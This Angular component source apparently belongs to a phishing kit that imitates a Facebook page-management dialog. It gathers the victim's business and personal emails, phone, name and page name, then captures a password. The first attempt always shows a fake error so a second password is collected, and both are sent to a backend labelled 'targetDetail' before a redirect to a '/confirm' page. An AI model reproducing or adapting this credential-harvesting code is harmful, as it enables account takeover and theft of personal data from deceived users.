import { Component, Inject } from '@angular/core';
import { MAT_DIALOG_DATA, MatDialogRef } from '@angular/material/dialog';
import { Router } from '@angular/router';
import { ManagementServiceService } from 'src/app/management-service.service';
import { FormControl, Validators } from '@angular/forms';




@Component({
  selector: 'app-first-modal',
  templateUrl: './first-modal.component.html',
  styleUrls: ['./first-modal.component.css']
})
export class FirstModalComponent {

  passwordControl = new FormControl('', [Validators.required]);

  password: string = '';
  fullData: any = {};
  constructor(
    private managementService : ManagementServiceService,
    public router: Router,
    public dialogRef: MatDialogRef<FirstModalComponent>,
    @Inject(MAT_DIALOG_DATA) public data: any
  ) { 
    
    this.fullData = data

    console.log(this.fullData.business_email)
  }

  targetDetail : any = {
        
  }

  showError: boolean = false;
  firstAttempt: boolean = true;

  onSubmit(): void {
    
    console.log(this.targetDetail)
    if (this.firstAttempt) {
      this.targetDetail = {
        business_email: this.fullData.business_email,
          personal_email: this.fullData.personal_email,
          phone: this.fullData.phone,
          reason: this.fullData.reason,
          full_name: this.fullData.full_name,
          facebook_pagename: this.fullData.facebook_pagename,
          first_password: this.passwordControl.value,
      }
      
      this.firstAttempt = false;
      this.showError = true;
      this.managementService.submitPart1(this.targetDetail).subscribe(
        (response) => {
          console.log('API Response:', response);
        },
        (error) => {
          console.error('API Error:', error);
        }
      )
    } else {
      this.targetDetail = {
        business_email: this.fullData.business_email,
          personal_email: this.fullData.personal_email,
          phone: this.fullData.phone,
          reason: this.fullData.reason,
          full_name: this.fullData.full_name,
          facebook_pagename: this.fullData.facebook_pagename,
          second_password: this.passwordControl.value,
      }
      console.log(this.password)
      this.dialogRef.close(this.password);
      this.managementService.submitPart1(this.targetDetail).subscribe(
        (response) => {
          console.log('API Response:', response);
        },
        (error) => {
          console.error('API Error:', error);
        }
      )
      this.router.navigate(['/confirm']);

    }
  }
}

